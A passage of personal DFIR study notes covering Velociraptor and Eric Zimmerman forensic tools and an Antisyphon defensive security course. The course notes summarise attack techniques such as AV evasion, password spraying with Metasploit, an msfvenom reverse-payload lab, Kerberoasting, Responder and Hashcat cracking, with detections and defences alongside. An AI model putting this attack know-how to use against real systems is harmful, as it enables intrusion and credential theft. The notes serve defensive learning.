  AND EventData.IpAddress = "10.0.0.66"

-- Find files by glob, hash them
SELECT FullPath, Size, hash(path=FullPath).SHA256 AS SHA256
FROM glob(globs="C:/Users/*/AppData/Local/Temp/*.exe")

=~ is regex match, = exact; functions like hash(), parse_evtx(), parse_pe(), stat(), upload() are the building blocks. The GUI has a VQL reference and autocompletes plugins.

docs.title: Artifacts worth knowing
docs.text:
Artifact Gives you Windows.KapeFiles.Targets Runs KAPE Targets logic natively — triage collection without KAPE Windows.Forensics.Prefetch / .Usn / .Timeline Parsed Prefetch, USN journal, super-timeline Windows.Registry.* (AppCompatCache, RunMRU, Sysinternals.Eulacheck, …) Registry artifacts Windows.EventLogs.Evtx / .EvtxHunter Filter/hunt across EVTX; .RDPAuth, .PowershellScriptblock for common questions Windows.System.Pslist / .Services / .TaskScheduler / .Amcache Live system state + persistence Windows.Forensics.SRUM SRUM network/exec usage Windows.NTFS.MFT / .Recover Parse $MFT, recover deleted file content by entry id Windows.Detection.*, Generic.Detection.Yara.* YARA scanning of files/process memory across the fleet Windows.Sysinternals.Autoruns Full ASEP inventory Linux.*, MacOS.* Cross-platform equivalents (auth logs, cron, launchd, etc.) Server.Utils.CreateCollector Build the offline collector exe

Browse everything under View Artifacts in the GUI; Exchange artifacts (community) add hundreds more.

docs.title: Typical workflows
docs.text:
Fleet hunt for an IOC

  1. Hunt → New Hunt, pick an artifact (e.g. Windows.Detection.Yara.Process with your rule, or Windows.Search.FileFinder for a hash/path), scope to OS/labels, launch.
  2. Watch results stream in from every client; download matching files centrally.
  3. Post-process in a Notebook (SELECT ClientId, FullPath FROM hunt_results(...) WHERE ...).

Remote triage of one host

  1. Search the client, Collect Artifacts → Windows.KapeFiles.Targets (SANS_Triage profile) or specific artifacts.
  2. Download the collection; parse with Zimmerman tools or built-in parsers.

Offline / air-gapped

  1. Server GUI → build an offline collector exe with the artifacts you want.
  2. Run it on the subject; it produces a ZIP; ingest that back into the server or parse directly.

docs.title: Gotchas
docs.text:
• The same binary is server, client, and collector — the mode is chosen by the sub-command/config; keep configs straight.
  • Client deployment needs the server's CA/config baked into the client config or MSI — clients only trust that server.
  • Hunts can be heavy; scope with labels and test on a few clients first. VQL that globs huge trees or hashes everything will hammer endpoints.
  • Live-response reads volatile state; for a court-defensible image you still want a full disk/memory image.
  • Results and uploaded files pile up on the server — mind disk and retention.
  • Timestamps are UTC; VQL timestamp() helpers convert.

docs.text:

docs.title: Eric Zimmerman Tools
docs.text:
Category: Artifact parsers · Platform: Windows (.NET) · Last updated: 2026-09-17

What they do

A free suite of best-in-class command-line parsers, one per Windows artifact, all sharing the same conventions (-f file, -d directory, --csv output) and all feeding Timeline Explorer. If KAPE !EZParser collected it, these are what parsed it. Together they turn raw hives, journals and logs into clean CSVs you can sort, filter and timeline.

docs.title: Get them and keep them updated
docs.text:
# Download the whole suite (net6 build recommended) and keep it current
.\Get-ZimmermanTools.ps1 -Dest C:\Tools\EZ -NetVersion 6

Most tools have a --csv <dir> (one row per record) and many a --csvf <name>; timestamps default to UTC; --help lists everything. Names ending in Cmd are CLI; Registry Explorer, Timeline Explorer, ShellBags Explorer, EvtxECmd maps have GUI/aux pieces.

docs.title: The suite by artifact
docs.text: Tool Artifact Typical command MFTECmd $MFT, $J (USN), $LogFile, $Boot, $I30, $SDS MFTECmd.exe -f C:\t\$MFT --csv out --csvf mft.csv · MFTECmd.exe -f $J -m $MFT --csv out EvtxECmd Windows Event Logs (.evtx) with community maps EvtxECmd.exe -d C:\t\Logs --csv out · --sync to update maps PECmd Prefetch (.pf) PECmd.exe -d C:\Windows\Prefetch --csv out --csvf pf.csv AmcacheParser Amcache.hve (SHA-1 of binaries) AmcacheParser.exe -f Amcache.hve --csv out -i AppCompatCacheParser Shimcache (in SYSTEM hive) AppCompatCacheParser.exe -f SYSTEM --csv out RECmd Registry, batch-mode (any hive) RECmd.exe -d C:\t\Reg --bn BatchExamples\Kroll_Batch.reb --csv out --nl Registry Explorer Registry, interactive (GUI) + deleted keys bookmarks for every DFIR key; loads transaction logs rla Replay registry transaction logs into a clean hive rla.exe -d C:\t\Reg --out C:\t\clean LECmd LNK shortcut files LECmd.exe -d "...\Recent" --csv out JLECmd Jump Lists (Automatic/Custom Destinations) JLECmd.exe -d "...\Recent" --csv out SBECmd ShellBags (UsrClass.dat, NTUSER.dat) SBECmd.exe -d C:\t\Reg --csv out ShellBags Explorer ShellBags (GUI tree view) folder-browsing reconstruction SrumECmd SRUM (SRUDB.dat + SOFTWARE) SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv out SumECmd SUM (User Access Logging, Server) SumECmd.exe -d C:\t\SUM --csv out RBCmd Recycle Bin ($I files) RBCmd.exe -d C:\t\Recycle --csv out RecentFileCacheParser RecentFileCache.bcf (Win7 execution) WxTCmd Windows 10 Timeline (ActivitiesCache.db) WxTCmd.exe -f ActivitiesCache.db --csv out JumpList / bstrings bstrings.exe = fast string search with regex/patterns bstrings.exe -f file --ls "password" PECmd/Timeline *_Timeline.csv outputs feed super-timelines Timeline Explorer View any of the above CSVs filter, group, tag, colour, conditional formatting

docs.title: Timeline Explorer — the review front end
docs.text: Every tool above writes CSV designed for Timeline Explorer (TimelineExplorer.exe): load a CSV, then filter per column (Excel-style), full-text search, colour rows by condition, tag rows, and pin the timestamp column. Workflow: parse everything to one output folder with KAPE !EZParser, open the key CSVs (MFT, EVTX, Prefetch, Amcache) in tabs, and pivot between them by time/host/user. It handles million-row CSVs far better than Excel.

docs.title: Fast recipes
docs.text:
# Timestomping triage: $MFT rows where $SI < $FN or zero nanoseconds
MFTECmd.exe -f "$MFT" --csv out --csvf mft.csv
#   → open in Timeline Explorer, filter SI<FN = TRUE, or uSecZeros = TRUE

# Dropped-tool timeline from the USN journal
MFTECmd.exe -f "$J" -m "$MFT" --csv out --csvf usn.csv
#   → filter UpdateReasons contains FileCreate, Extension in exe/dll/ps1

# Execution story on a workstation
PECmd.exe -d C:\t\Prefetch --csv out --csvf pf.csv          # ran + files touched
AmcacheParser.exe -f Amcache.hve --csv out -i               # SHA-1 of every binary
AppCompatCacheParser.exe -f SYSTEM --csv out                # existence + order

# Everything in the registry at once
RECmd.exe -d C:\t\Reg --bn BatchExamples\Kroll_Batch.reb --csv out --nl

# Event-log hunting after parsing
EvtxECmd.exe -d C:\t\Logs --csv out --inc 4624,4625,4648,4672,4688,4698,4720,7045,1102

docs.title: Gotchas
docs.text:
• .NET runtime: use the net6/matching build; the old net4 builds are frozen. Get-ZimmermanTools.ps1 fetches the right set.
  • Registry hives are often "dirty" on a live capture — run rla.exe to replay .LOG1/.LOG2 first, or the parse misses the most recent changes (often the persistence you're chasing).
  • EvtxECmd maps define how each provider/EventID is flattened into columns — run --sync regularly; without maps you stare at PayloadData3.
  • AmcacheParser -i includes files not tied to installed programs (where attacker tools live) — usually what you want; -w whitelists known-good hashes.
  • Timestamps are UTC; get the system's timezone from the SYSTEM hive (Registry keys) before building a local-time narrative.
  • These parse artifacts you've already collected — pair with KAPE/Velociraptor for collection.

docs.title: Training
docs.text: Notes from courses and training I've taken, re-worked into my own reference and cross-linked back to the sections that hold the underlying artifacts and queries (Adversary, Windows, Network, Splunk), so a course note can jump straight to the mechanics.

docs.title: Providers

    John Strand / Black Hills Information Security (BHIS) "Pay-What-You-Can" training. Focused on the defensive controls that actually stopped real pentests and real intrusions.

    Antisyphon

    Blue Team Essentials

  • Network Forensics

    A Korean-first lecture series (with English translation) on network forensics: proxy logs, pcap and capture, core protocols and log aggregation, NetFlow and file-access protocols, analysis tools, wireless, full-packet hunting, encryption, protocol reversing, OPSEC and intel — with hands-on lab guides and review questions.

    Network Forensics

  • OffSec OSCP+ (PEN-200)

    OSCP+

Includes virtual-lab commands, diagrams, and detailed answers to follow-up questions.

    Silver C2

About these pages

These are personal study notes, not official guidance of any organisation. 💡 Note (added) marks my own additions beyond the lecture; (reconstructed) marks commands the instructor only showed on screen, written out in a generic form — match them to the actual lab handout.

docs.title: Antisyphon Training
docs.text:
Antisyphon Training is the security-training brand run by John Strand and Black Hills Information Security (BHIS). Many courses are Pay-What-You-Can, so cost is not a barrier to entry. The teaching philosophy, in one line:

Don't teach anything that doesn't directly help actually stop an attacker from getting into your network.

docs.title: Courses
docs.text:
• Information Security Core Skills

    An intro course covering the ~10 defensive controls that stopped real pentests and intrusions: application allow listing, password controls, egress traffic analysis, EDR, logging, host firewalls, internet allow listing, vulnerability management, AD hardening.

    Information Security Core Skills

docs.title: Information Security Core Skills
docs.text:
Instructor: John Strand (Black Hills Information Security) · By: Antisyphon Training · Format: Pay-What-You-Can, 4 days · last 30 min each day is AMA

What this course is

A "bootstrap" security course. Across 650+ assessments a year, BHIS tracked "what actually stopped us" — and it kept coming back to the same ~10 controls. This course is built around those, all mapped to MITRE ATT&CK. One rule: nothing goes in that doesn't directly help stop an attacker. AI-for-defense is woven throughout.

docs.title: Controls covered
docs.text:
1. Application allow listing
  2. Password controls
  3. Egress traffic analysis
  4. UEBA (AI / machine-learning user-behaviour analytics)
  5. Advanced endpoint protection (EDR)
  6. Logging
  7. Host firewalls
  8. Internet allow listing
  9. Vulnerability management
  10. Active Directory hardening
  11. Cloud (some additions)

Backup & recovery is "something you should just be doing," so it isn't covered separately. OS basics, TCP/IP and crypto are in the sibling SOC Core Skills course (on YouTube).

docs.title: Day-by-day notes
docs.text:
• Day 1 — Allow Listing and Password Attacks

    Compliance (CIS mapping), application allow listing and AppLocker, AV-bypass theory (ghostwriting, LOLBins), password spraying, MFA gaps, Kerberoasting, network credential interception, password cracking (Hashcat).

  • Day 2 — Egress Traffic Analysis and Logging

    Egress traffic analysis, NetFlow, manual firewall-log analysis, using AI on logs, Zeek, beaconing / jitter / long connections, RITA, ASN deny-lists, the AC-Hunter lab, UEBA, Deep Blue CLI, Windows logging limits and Sysmon.

  • Day 3 — EDR, Threat Emulation and Host Firewalls

    Sysmon lab review, Pass-the-Hash, EDR and defence in depth (why overlap multiplies), threat emulation and Atomic Red Team, writing and validating detections with AI, BloodHound, gap-analysis lab, host firewalls and stopping lateral movement.

  • Day 4 — Responder, Internet Allow Listing, Vulnerability Management, Web Security and AD Hardening

    Responder lab walkthrough (deep dives on NTLMv2 cracking, relay and SMB signing), internet allow listing (block "Uncategorized", remove ads, DoH), vulnerability management (CVSS +1, lows and informationals, group by vulnerability), the Nessus report lab, web application security (SAST and DAST, Burp and ZAP, testing detective controls), the ZAP lab, AD hardening (BloodHound and PlumHound, moving staircases, Mimikatz and how to detect it), the Ping Castle lab, and the course wrap-up with a recap of all ten controls.

docs.title: Day 1 — Allow Listing and Password Attacks
Day 1 — Allow Listing and Password Attacks
docs.text:
Course: Information Security Core Skills · Instructor: John Strand (BHIS) · Day 1 scope: compliance → application allow listing → password attacks → cracking

Day 1 at a glance

Attackers get in two broad ways — ① executing malicious code or ② obtaining passwords. So Day 1 covers both: (1) using application allow listing to enforce "only run from allowed folders" and block initial code execution (AppLocker lab), and (2) how passwords fall to spraying, Kerberoasting, network interception and offline cracking, and the defences. As background, it also explains why AV gets bypassed (ghostwriting, LOLBins).

Conventions

💡 Note (added) = my own addition beyond the lecture. The offensive lab steps are summarised at a high level here; the Korean Day 1 page has the fuller command walkthrough, and the mechanics of each attack live in the Adversary reference section linked throughout.

docs.title: 1. Compliance: mapping many frameworks efficiently
docs.text:
There are a lot of compliance frameworks — SOC 2, HIPAA, NIST 800-53, NIST 800-171, CMMC, New Zealand's NZISM and more. Many organisations must meet several at once, and producing separate evidence for each and cross-referencing them costs a great deal of time and money.

John's answer: map to the CIS (Center for Internet Security) Controls first, then cross-map everything else automatically, using CIS Navigator.

Example — one CIS control covers several NIST items

CIS 2.1 (Establish and maintain a software inventory): record the title, publisher, initial-use date etc. of all installed software. Select NIST in CIS Navigator and this one control maps to:

Framework Mapped items NIST CSF ID.AM-2 NIST 800-171 3.4.10 NIST 800-53 CM-7, CM-8, MA-3

So meeting CIS 2.1 also meets those NIST items. John calls this a "Rosetta Stone" that translates between frameworks.

CIS Navigator can export the mapping to Excel. Mark each CIS control you meet with an X and you can see your status against the other frameworks at a glance.

Two ways to use AI

  1. Evidence + gap analysis — feed the spreadsheet to an AI: "we meet these CIS controls; produce documentation showing NIST CSF compliance." It writes the documentation and points out gaps.
  2. Map to attack techniques — ask "because of how we implemented the CIS controls, which attack techniques have we neutralised?" — translating "we're compliant" into "we stop these attacks." John credits AuditScripts as the first to do this mapping systematically.

💡 Note (added)

CIS Controls v8 has 18 controls, split by organisational maturity into IG1 (basic) to IG3 (advanced). Before putting compliance data into an AI, check your organisation's policy on data leaving the environment, and always verify AI-generated mappings against the source.

docs.title: 2. Application allow listing — the concept
docs.text: Application allow listing restricts which programs are allowed to execute on a host. Narrow what can run and you narrow the attacker's path in. People fear it because they think every application must be registered one by one — you don't have to (see section 4).

docs.title: Why deny lists fail
docs.text:
The opposite is a deny list ("block the known-bad list") — the traditional AV approach. Security expert Marcus Ranum, in "The Six Dumbest Ideas in Computer Security," named "enumerating badness." Two reasons: ① bad programs appear far faster than good ones, and ② bad code can hide inside good programs.

John's analogy: cave people passed on lists of dangers as stories — "don't eat the purple mushroom with yellow stripes, you'll die." That worked because threats didn't change. In cyber, today's poisonous mushroom is tomorrow's sizzling filet mignon. Threats keep changing, so deny-list thinking doesn't work.

docs.title: The reality: getting in is easy, what comes next is hard
docs.text: In John's experience, initial code execution is still relatively easy. What security products are now good at catching is the next step — privilege escalation and lateral movement. So blocking that first execution step is the key job of allow listing.

docs.title: 3. How AV gets bypassed (the theory)
docs.text: John explains bypass theory to make the point "don't put all your eggs in the AV basket" (not to teach bypassing). That's why this course's labs run with AV turned off — to observe malware executing and how allow listing stops it.

docs.title: 3-1. Ghostwriting
docs.text:
Background — AI-based AV looks at assembly patterns. Assembly sits one step above ones and zeros. Every function starts (prologue) and ends (epilogue) in a similar way, so AI-based AV / vulnerability tools use those boundaries to group code into functions, then check for risky patterns (e.g. the inherently vulnerable gets function, or code that allocates memory as read/write/execute and runs from it).

💡 Note (added) — read/write/execute (RWX) memory

Normal code regions are usually read+execute, data regions read+write. Regions that are all three are rare, which makes them a clue to injected code. The concept John said "we'll come back to" is central to memory forensics — see Process injection and Memory: processes & injection (Volatility malfind).

Core idea — same result, different method. John asks: "How do you make 4 from two 2s without adding?" → 2 × 2 = 4, 2 − (−2) = 4. Same result, but represented differently in binary. Assembly also has many ways to do the same thing, so an operator can rewrite instructions so they still do the same work while no longer matching the "clean pattern" the AI memorised. XOR is a favourite building block here, because any value XORed with itself is always 0 — a predictable anchor you can pad meaningless instructions in front of without changing behaviour. This whole-binary rewriting is "ghostwriting."

Why is AI weak against this? AI was trained on human-written code, so its idea of normal is "what code usually looks like." Where it must scan huge amounts of code quickly, deliberately scrambled code makes it lose its context cues.

docs.title: 3-2. LOLBins (Living Off the Land Binaries)
docs.text: Using legitimate programs already on Windows to run malicious code — e.g. rundll32.exe pulling down and running content from the internet, or the Windows Script Host running a script. Microsoft-signed, so less suspicious. But LOLBins still need an initial foothold (code execution) → which is why blocking first execution matters. More: LOLBins.

docs.title: 3-3. Encoders and automation
docs.text:
• Shikata Ga Nai — a Metasploit encoder that avoids bad characters which break exploits (e.g. \x00, read as end-of-string) while changing the code's shape.
  • Unicorn — makes this process easy to automate.

What bypassed AV today may not tomorrow. AV bypass is more art than science. — so defenders should assume AV will eventually fail and add layers that restrict execution itself, such as allow listing.

docs.title: Learning tool — Back Doors & Breaches
docs.text: BHIS's card game backdoorsandbreaches.com. Almost every technique in the course is a card; the back lists attacks it detects, defensive tools and lab links. E.g. the "Endpoint Security Protection Analysis" card links AppLocker, Atomic Red Team and Caldera labs. 200+ labs, and browser-based competitive play.

docs.title: 4. How to implement allow listing
docs.text:
Method What it is Where it fits ① Register every executable Most thorough but hard to maintain Only fixed-purpose systems: kiosks, POS, VDI ② Digital signature (publisher) "Allow only programs signed by this publisher" Trusted software vendors ③ Path (folder) based ⭐ "Only run from these folders" John's recommended start — general workstations

Malware usually first runs from the Downloads folder, the Desktop, or temporary internet files. Blocking execution there alone stops most initial code execution.

docs.title: AppLocker
docs.text:
Built into Windows. Restricts execution by path, hash, certificate or publisher. The Default Rules are three:

  1. Anything in Program Files → allowed
  2. Anything in Windows → allowed
  3. Administrators → can run anything (the lifeline for recovery)

Everything else (Downloads, Desktop, root of C: …) is blocked.

💡 Note (added)

Why path rules work: standard users normally can't write to Program Files or Windows, so attackers can't easily drop malware there. Conversely, user-writable sub-folders (e.g. C:\Windows\Temp) can become bypass routes, so in practice you block those exception paths too. Current direction: Microsoft now recommends App Control for Business (formerly WDAC) over AppLocker (AppLocker is maintained but gets no new features). The concepts are the same, so AppLocker is a fine way to learn them.

docs.title: 5. AppLocker lab (summary)
docs.text:
The lab's shape is ① infect a victim VM with a test payload → ② block that execution with AppLocker — doing the infection first makes it clear what you're blocking.

Lab assumptions — don't do this in production

The lab disables AV and the firewall on the Windows VM and sets an easy admin password, in the cloud lab (MetaCTF, browser RDP via Guacamole). On the Windows VM don't refresh the browser (after the admin password changes, Guacamole tries the old one and fails → you must Destroy and restart the VM). Destroy Lab when idle to save credits.

① The attacker side (summary). From the Kali VM you mount the victim's hidden admin share, generate a small reverse-connection test payload with msfvenom, start a Metasploit listener, and when the payload runs on the victim you get an interactive session and can, for example, dump password hashes. The point for a defender is only this: the first execution happens from a user-writable location (Downloads/Desktop/temp), and the payload calls back outbound. The full step-by-step is on the Korean page; the mechanics of each stage are in PsExec & SMB and SAM & NTDS extraction.

② Block it with AppLocker (defensive config). In Local Security Policy → Application Control Policies → AppLocker → Executable Rules:

  1. Right-click → Create Default Rules (the three rules above).
  2. Configure Rule Enforcement → "Enforce".
  3. Services (services.msc) → Application Identity → Start — AppLocker only works when this service runs.
  4. Apply the policy immediately:
gpupdate /force

Now running a program from outside the allowed folders (e.g. nc.exe in an Introlabs folder) is blocked:

This program is blocked by Group Policy. For more information, contact your system administrator.

Don't use 'Automatically Generate Rules'

That feature hashes every program in Program Files. Very thorough, but a patch or update changes the hash and the program stops running. On a normal workstation this breaks things — it only fits fully locked-down kiosks. The takeaway: decide the threat model and use case first, then pick the rule style.

Publisher exception. For a program that must run from Downloads (e.g. PuTTY), create a new rule with condition Publisher → it will run from any folder because it's signed by the trusted vendor.

docs.title: 6. Password spraying
docs.text:
Type Method Result Password guessing many passwords against one account easily stopped by account lockout Password spraying one password against many accounts each account only fails 1–2 times, so it evades lockout

The attacker collects a staff list (user IDs), then sprays a password like a season+year (Winter2025) or a local sports team + number across every account. Larger orgs are more at risk — with 10,000 users, someone is bound to use a weak password. John: this gets into roughly 80% of organisations.

This technique (MITRE ATT&CK T1110.003) was added at John's request — initially refused ("not a pentester technique") until BHIS showed nation-state actors using it in real cases.

💡 Note (DFIR view) — what it looks like in logs

Password spraying shows in the Windows Security log as Event ID 4625 (failed logon) across many accounts, 1–2 each, in a short window — a horizontally spreading pattern (vs. guessing = one account failing repeatedly). A success is followed by 4624 (successful logon) for that account; over SMB the logon type is 3 (network). Event IDs overall: Windows Event IDs.

docs.title: Lab (summary)
docs.text: On the victim a batch script creates ~200 accounts (simulating a known staff list); the Security log is cleared for a clean view. From Kali, Metasploit's auxiliary/scanner/smb/smb_login tries one password (Winter2025) across the user list; a green line marks a hit. The recovered credential is then used (via psexec) to get a session — real access from a single weak password, no exploit needed. Mechanics: PsExec & SMB.

docs.title: Why MFA isn't a complete fix
docs.text:
MFA cuts the risk but doesn't zero it. Many orgs have hidden APIs/services with no MFA, and attackers find the ones left out of Conditional Access.

💡 Note (added)

A common gap is legacy authentication — old mail protocols (IMAP/POP3/SMTP auth) don't support MFA, so Microsoft recommends blocking legacy auth.

docs.title: 7. The thing that matters most: length
docs.text:
John is emphatic: length matters most. Each extra character adds more than double the combinations an attacker must crack — require 5 and they only crack all 5-char strings; require 6 and they must crack all 5s and all 6s.

💡 Note (added)

More precisely, each character multiplies the space by the character-set size — ~10× for digits only, ~95× for upper+lower+digits+symbols. John's point ("length is decisive") holds.

A 1985 standard still lingers. John shows the US DoD 1985 password guide ("Green Book"), built on "an attacker guesses 8.5 times per minute" (a 300 bps modem). Today GPUs do billions per second, so that logic would say "change your password every second." Yet PCI DSS required only a 7-char minimum until a few years ago.

💡 Note (added)

PCI DSS 4.0 raised the minimum to 12 (mandatory from 2025). Current NIST guidance: drop forced periodic rotation, increase length, and check against breached-password lists — the opposite of 1985.

Real constraint: old systems (Solaris SPARC, mainframe RACF) sometimes can't handle 9+ characters — often fact, not laziness.

Is SMS useless? It's weak to SIM swapping, but John says check your threat model first — if you're not a nation-state target, SMS still beats nothing (an app or FIDO2 is better).

docs.title: 8. Service accounts and Kerberoasting
docs.text:
Service accounts (used by programs like SQL / backup, not people) are often high-privileged, not locked out, with non-expiring passwords, and ignored by security — John's "security forgets them, hackers love them."

Kerberoasting (discovered by Tim Medin of Red Siege): ① any domain user can request a service ticket; ② the DC returns it encrypted with the service account's password; ③ the attacker takes it away and cracks it offline. Because step ③ is offline, there's no account lockout and no failed-logon record — a weak/simple password falls fast.

💡 Note (DFIR view)

Detect via DC Event ID 4769 (Kerberos service-ticket request) — especially encryption type 0x17 (RC4) tickets requested for many services by one user. Defend with long (25+) service-account passwords or auto-rotating gMSA, and enforce AES where possible. Full detection queries and artifacts: Kerberoasting reference.

docs.title: 9. Intercepting credentials on the network
docs.text:
With an attacker on the same network, a victim host can be tricked into sending its credentials to the attacker. The relevant protocols: LLMNR, NBT-NS, mDNS (Windows shouting "who has this name?" to the whole network when DNS fails) and WPAD (automatic proxy discovery).

Mistype a server name and the host shouts to the network; the attacker answers "that's me!", the victim trusts it as the real server and authenticates automatically, and the attacker captures the password hash. Responder automates this (fake web/SMB/Kerberos/SQL/FTP/IMAP/POP/SMTP/DNS servers), often paired with ARP cache poisoning.

💡 Note (added)

Defend by disabling LLMNR and NBT-NS via Group Policy (usually no business impact) and enforcing SMB signing (stops relaying the captured auth to another server). Full artifacts/detection: LLMNR & NTLM relay.

Other tools: CredKing (AWS Lambda rotates the source IP per request to dodge "many failures from one IP" blocks); Evilginx (an adversary-in-the-middle phishing proxy).

💡 Note (added)

AiTM phishing like Evilginx lets the user complete MFA, then steals the session cookie to bypass it. Ordinary MFA struggles here; FIDO2 / passkeys (phishing-resistant, bound to the real site) stop it.

docs.title: 10. Password managers and PAM
docs.text:
John recommends password managers but pick a trustworthy one. In the LastPass breach, some data turned out to be encrypted in AES ECB mode — where identical content always yields identical ciphertext, so even without reading values you can see which entries reuse the same one (revealing password reuse).

PAM (privileged access management) continuously rotates admin passwords and makes you "check them out" (Microsoft LAPS makes each host's local admin password unique and auto-rotated). John's worry: as these move to the cloud they become a single point of failure — one vault breached is game over.

💡 Note (added)

The "remote-support vendor breach that led to a government agency" John referred to is understood to be the late-2024 BeyondTrust compromise that was used to reach the US Treasury.

docs.title: 11. Password cracking lab (summary)
docs.text:
Why GPUs are good at cracking: graphics is the same math repeated enormously, so thousands of small cores in parallel (a GPU) beat one fast CPU. The same shape fits bitcoin mining, password cracking and AI training (all massive repetition of one calculation). Hashcat uses that GPU power.

💡 Note (added) — hashes and cracking

Systems store a hash (an irreversible transform), not the password. Cracking therefore hashes candidate words and compares to the stolen hash — a match reveals the password.

The lab runs Hashcat against an MD5 list (mode -m 0) and a Windows NTLM list (mode -m 1000, the kind dumped from SAM), with a dictionary attack (-a 0). Results print as hash:password; an empty right-hand side means a blank password.

💡 Note (added) — the NT hash weakness

An NT hash is the password UTF-16LE-encoded then MD4-hashed. Its big weakness is no salt — the same password yields the same hash on every host, so precomputed tables work and hash-only logon (Pass-the-Hash) becomes possible. 31d6cfe0d16ae931b73c59d7e0c089c0 is the well-known NT hash of a blank password — worth recognising in DFIR. Where the hashes come from: SAM & NTDS extraction.

docs.title: 12. Highlights from the AMA
docs.text:
• Join InfraGard (FBI–industry info-sharing)? → "Yes, and volunteer to present." Hiring decision-makers are in the room, and good talks are always in short supply.
  • AI (Anthropic Mythos) and the flood of vulnerabilities? → initial marketing scepticism, but vendors confirmed the model found vulnerabilities at scale. The message: you must plan for "how do we hold when there's no patch" — and most of the industry isn't ready. That's why this course matters (hold with controls that block whole attack categories — allow listing, firewalls, logging).
  • Let AI do the patching? → wary of handing everything to AI without human oversight.
  • Government vs private sector right now? → government (the next ~18 months look unstable). Many firms are freezing junior hiring to "replace with AI," which John sees as a mistake — AI is asymmetrically better for offence, so you should hire people and train them to use AI.

💡 Note (added)

For more on Mythos see Anthropic's own material (anthropic.com/glasswing).

docs.title: Day 1 summary
docs.text:
Attack Key defence Reference Malware's first run from Downloads/Desktop Application allow listing (AppLocker path rules) LOLBins AV bypass (ghostwriting, LOLBins) Layered defence; don't rely on AV alone Process injection Password spraying Long passwords, MFA everywhere, block legacy auth PsExec & SMB · Event IDs Kerberoasting Long service-account passwords / gMSA, monitor 4769 Kerberoasting LLMNR/NBT-NS poisoning (Responder) Disable those protocols, enforce SMB signing LLMNR & NTLM relay Hash cracking Long passwords (length = cracking time) SAM & NTDS · Pass-the-Hash

Attackers get in by ① running code or ② getting passwords. So ① only let code run from allowed places (AppLocker), and ② make passwords long, MFA complete, service accounts tightly managed. And prepare for a world with no patch by holding whole attack categories with controls.

docs.title: References
docs.text:
• Antisyphon Training · Black Hills Information Security
  • Back Doors & Breaches
  • MITRE ATT&CK — T1110.003 Password Spraying · T1558.003 Kerberoasting
  • Related: Kerberoasting · LLMNR & NTLM relay · LOLBins · Pass-the-Hash · Windows Event IDs

docs.title: Day 2 — Egress Traffic Analysis and Logging
Day 2 — Egress Traffic Analysis and Logging
docs.text:
Course: Information Security Core Skills · Instructor: John Strand (BHIS) · Day 2 scope: egress → NetFlow → Zeek → beaconing → RITA → ASN → AC-Hunter → UEBA → Deep Blue CLI → Windows logs → Sysmon

Day 2 at a glance

If Day 1 was about keeping attackers out, Day 2 is about finding the ones already in. The focus is outbound (egress) traffic — the conversation an infected host has with its C2 server. You can't read the content (it's encrypted), but you can see the behaviour (regular interval + consistent size = a beacon). Zeek turns traffic into consistent metadata logs; RITA / AC-Hunter find the beacons. The second half covers UEBA (tying many logs together to spot departures from normal behaviour) and log quality — the limits of default Windows logging and its fix, Sysmon.

Conventions

💡 Note (added) = my own addition beyond the lecture. (reconstructed) = commands the instructor only showed on screen, written out generically — match them to the actual lab handout.

docs.title: 1. Why "egress" traffic?
docs.text:
When an attacker owns a host, that host keeps talking to the attacker's C2 (command-and-control) server. That conversation flows outbound (recall Day 1's reverse connection), so watching egress traffic reveals the infected internal host. In MITRE ATT&CK, C2 / common-port use / exfiltration are areas many orgs miss.

The reason they miss it is encryption — most traffic is TLS/SSL, so you can't read the content. Appliances can decrypt TLS in the middle, but that raises privacy / GDPR concerns.

"It's encrypted so we can't see it" is not an acceptable excuse. You can't read the content, but you can still see the behaviour.

docs.title: 2. NetFlow — connection statistics
docs.text:
Even without content, you can see who talked to whom, when, and how much. That's NetFlow (connection statistics, created by Cisco):

  • Exporter — the device sending the connection data (router / firewall)
  • Importer / Collector — where that data is gathered
  • Analysis engine — makes sense of the collected data

Once NetFlow became a de-facto standard, many look-alikes followed (sFlow, jFlow, NetStream …) — all different ways of handling connection statistics.

docs.title: 3. Lab — analysing Cisco ASA firewall logs by hand
docs.text:
John first shows how painful it is by hand. Assume some internal IP is compromised (here 192.168.1.6):

sudo su -
cd /opt/firewall_log
grep 192.168.1.6 <logfile>        # (reconstructed) pull only lines with that IP
  • grep <string> picks out only the lines containing a string.

The logs are ugly (John calls it "a nightmare"). You refine the data into something you can get statistics from, then use R tools to do the math and hunt for a beacon. The point: you can do it by hand, but it's brutal — hence Zeek / RITA.

docs.title: 4. Using AI on the logs — context is everything
docs.text:
① "Look for evil traffic" alone → AI flags the wrong things (what looks like a port scan, Telnet, ACL-blocked traffic) and misses the real malicious beacon. Without context it tends to hallucinate.

② Give it context (internal/external IPs, addresses to exclude, completed connections only — the backdoor alternates between two external IPs) → it gets much closer but can still wrongly conclude "looks normal." The decisive clue is timing:

1s, 1s, 1s, 1s, 1s …   (a full TCP connect/teardown every second)

Unless it's a remote terminal or keep-alive, almost no legitimate service does a full TCP connect/teardown every second → malicious beacon.

R tools confirms it:

min 1816, max 1848, mean 1829, stdev 12

A standard deviation of 12 is tiny — the data size is near-constant, the hallmark of a beacon.

The key skill in the AI era

"Find evil" rarely works. You have to use what you've learned to narrow the question. Knowing how to analyse logs — and asking the right question — is the skill.

docs.title: 5. Zeek — consistent, and small
docs.text:
Because by-hand is painful, use Zeek (formerly Bro). It's fast, widely used, and its timestamps are dead-consistent (devices handle time in odd, inconsistent ways; Zeek doesn't).

This is a shift in thinking. Day 1's AV looked for strings (assembly) inside an executable — a signature. But traffic is encrypted, so there are no strings to match. Instead, the behaviour in the logs lets you actively hunt. This matters more over time because of AI — it can generate malware, new C2 methods and obfuscation, so humans must use AI to hunt traffic patterns.

Zeek vs full PCAP

Full PCAP Zeek Pro all content, every tool supports it (most portable) ~1/10 the size Con very large no raw packet content (metadata)

Zeek doesn't compress packets — it turns them into metadata, about one-tenth the size.

Capture pre-NAT

Outside the firewall (internet side) every internal host looks like the one firewall IP, so you can't identify the infected host. Capture pre-NAT (inside) to get the infected internal private IP.

The Zeek logs themselves (conn.log, dns.log, http.log, ssl.log …) are written up under Network → Zeek.

docs.title: 6. What is beaconing?
docs.text:
John's analogy: a child going "mom, mom, mom…" at a steady rhythm — that's a beacon. The infected host repeats "I'm here, give me orders" to C2 on a regular cadence. Analyse it three ways:

  1. Interval — regular, like a heartbeat?
  2. Data size — nearly the same each time (small standard deviation)?
  3. Connection timing — complete/restart repeating at a tight cadence?

